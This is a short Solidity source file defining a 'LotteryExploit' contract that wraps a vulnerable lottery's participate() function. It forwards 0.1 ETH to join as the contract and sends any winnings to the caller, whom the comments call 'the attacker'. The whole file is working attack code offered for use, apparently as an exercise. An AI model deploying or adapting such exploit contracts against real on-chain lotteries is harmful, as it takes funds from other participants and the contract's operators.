pragma solidity ^0.4.19;

interface IVulnerableLottery {
    function participate() external payable;
}

contract LotteryExploit {
    IVulnerableLottery public target;

    function LotteryExploit(address _target) public {
        target = IVulnerableLottery(_target);
    }

    function exploit() public payable {
        require(msg.value >= 0.1 ether);
        
        // Forward 0.1 ETH to the lottery contract to participate as this contract
        target.participate.value(0.1 ether)();

        // If it won, the contract will receive 0.7 ETH (7x)
        // We can then forward to the attacker
        msg.sender.transfer(address(this).balance);
    }

    function () public payable {}
}

